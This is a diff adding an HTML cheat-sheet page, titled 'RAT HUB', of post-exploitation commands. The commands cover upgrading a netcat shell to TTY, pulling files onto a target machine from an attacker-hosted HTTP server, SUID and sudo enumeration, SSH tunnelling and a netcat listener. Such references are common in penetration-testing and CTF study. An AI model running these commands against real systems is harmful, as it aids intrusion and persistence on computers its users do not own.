@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT HUB - Security Cheat-Sheet & Reference</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="cheat.css">
+</head>
+<body class="cheat-body">
+
+    <!-- LOGIN MODAL -->
+    <div id="cheat-login-modal" class="cheat-login-overlay">
+        <div class="cheat-login-box">
+            <div class="cheat-login-header">
+                <i class="fas fa-book-skull"></i>
+                <h2>CHEAT-SHEET LOGIN</h2>
+            </div>
+            <p>Soraq kitabçasına daxil olmaq üçün təsdiqləyin.</p>
+            
+            <form onsubmit="handleCheatLogin(event)">
+                <div class="input-group">
+                    <i class="fas fa-user"></i>
+                    <input type="text" id="cheat-login-username" placeholder="İstifadəçi adı" autocomplete="off" required>
+                </div>
+                <div class="input-group">
+                    <i class="fas fa-lock"></i>
+                    <input type="password" id="cheat-login-password" placeholder="Şifrə" required>
+                </div>
+                <button type="submit" id="cheat-login-btn">Daxil Ol</button>
+            </form>
+
+            <p id="cheat-login-error" class="error-msg"></p>
+        </div>
+    </div>
+
+    <!-- MAIN DASHBOARD -->
+    <div id="cheat-dashboard" class="cheat-container hidden">
+        
+        <!-- HEADER -->
+        <header class="cheat-header">
+            <div class="header-title">
+                <i class="fas fa-terminal"></i>
+                <span>Security Command & Payload Reference</span>
+            </div>
+            <div class="search-box">
+                <i class="fas fa-search"></i>
+                <input type="text" id="cheat-search" placeholder="Komanda və ya sintaksis axtar..." onkeyup="filterCheats()">
+            </div>
+        </header>
+
+        <!-- CONTENT GRID -->
+        <main class="cheat-grid" id="cheat-cards-grid">
+            
+            <!-- CARD 1: TTY Shell Upgrade -->
+            <div class="cheat-card" data-category="tty">
+                <h3><i class="fas fa-desktop"></i> TTY Shell Upgrade (Stabilizasiya)</h3>
+                <p>Netcat üzərindən gələn sadə shell-i tam interaktiv TTY shell-ə çevirmək üçün:</p>
+                <div class="code-box">
+                    <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+                <div class="code-box">
+                    <code>export TERM=xterm && stty raw -echo; fg</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+            </div>
+
+            <!-- CARD 2: File Transfer (Python HTTP) -->
+            <div class="cheat-card" data-category="transfer">
+                <h3><i class="fas fa-file-arrow-down"></i> Quick File Transfer (Hədəfə Fayl Atmaq)</h3>
+                <p>Yerli maşında HTTP server açmaq:</p>
+                <div class="code-box">
+                    <code>python3 -m http.server 80</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+                <p>Hədəf maşından faylı çəkmək (Wget / Curl):</p>
+                <div class="code-box">
+                    <code>wget http://<span class="hl">IP</span>/file.txt VƏ YA curl -O http://<span class="hl">IP</span>/file.txt</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+            </div>
+
+            <!-- CARD 3: Linux Privilege Escalation Basics -->
+            <div class="cheat-card" data-category="privesc">
+                <h3><i class="fas fa-user-shield"></i> Linux PrivEsc (Sual / Yoxlama)</h3>
+                <p>Sudo hüquqlarını yoxlamaq:</p>
+                <div class="code-box">
+                    <code>sudo -l</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+                <p>SUID icazəsi olan faylları tapmaq:</p>
+                <div class="code-box">
+                    <code>find / -perm -4000 2>/dev/null</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+            </div>
+
+            <!-- CARD 4: Port Forwarding & Tunneling -->
+            <div class="cheat-card" data-category="network">
+                <h3><i class="fas fa-network-wired"></i> Port Forwarding (SSH Tunnel)</h3>
+                <p>Uzaq şəbəkə portunu yerli porta yönləndirmək:</p>
+                <div class="code-box">
+                    <code>ssh -L <span class="hl">local_port</span>:target_ip:target_port user@<span class="hl">gateway_ip</span></code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+            </div>
+
+            <!-- CARD 5: Base64 Encoding / Decoding -->
+            <div class="cheat-card" data-category="encoding">
+                <h3><i class="fas fa-code"></i> Base64 Encodings (Terminal)</h3>
+                <p>Mətni Base64-ə çevirmək:</p>
+                <div class="code-box">
+                    <code>echo -n "text" | base64</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+                <p>Base64 şifrəsini açmaq:</p>
+                <div class="code-box">
+                    <code>echo "dGV4dA==" | base64 -d</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+            </div>
+
+            <!-- CARD 6: Netcat Listener -->
+            <div class="cheat-card" data-category="listener">
+                <h3><i class="fas fa-satellite-dish"></i> Netcat Listener (Bağlantı Qəbulu)</h3>
+                <p>Port dinləməyə başlamaq:</p>
+                <div class="code-box">
+                    <code>nc -lvnp 4444</code>
+                    <button class="copy-btn" onclick="copyCode(this)"><i class="fas fa-copy"></i></button>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <script src="cheat.js"></script>
+</body>
+</html>
